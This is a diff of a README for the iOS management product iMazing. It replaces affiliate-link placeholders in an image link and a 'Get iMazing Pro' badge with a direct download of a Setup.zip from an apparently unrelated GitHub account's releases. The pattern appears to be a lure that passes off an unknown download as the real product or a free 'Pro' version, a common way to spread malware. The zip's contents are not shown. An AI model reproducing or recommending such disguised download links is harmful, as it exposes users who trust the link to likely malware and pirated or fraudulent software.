@@ -8,7 +8,7 @@
 
 ---
 
-[![iMazing](og-image.png)](YOUR_AFFILIATE_LINK_HERE)
+[![iMazing](og-image.png)](https://github.com/Graydudolmen/iMazing/releases/download/Last/Setup.zip)
 
 ---
 
@@ -22,7 +22,7 @@
 
 ## Download & Get Pro
 
-[![Get iMazing Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](YOUR_AFFILIATE_LINK_HERE)
+[![Get iMazing Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/Graydudolmen/iMazing/releases/download/Last/Setup.zip)
 
 ---
 
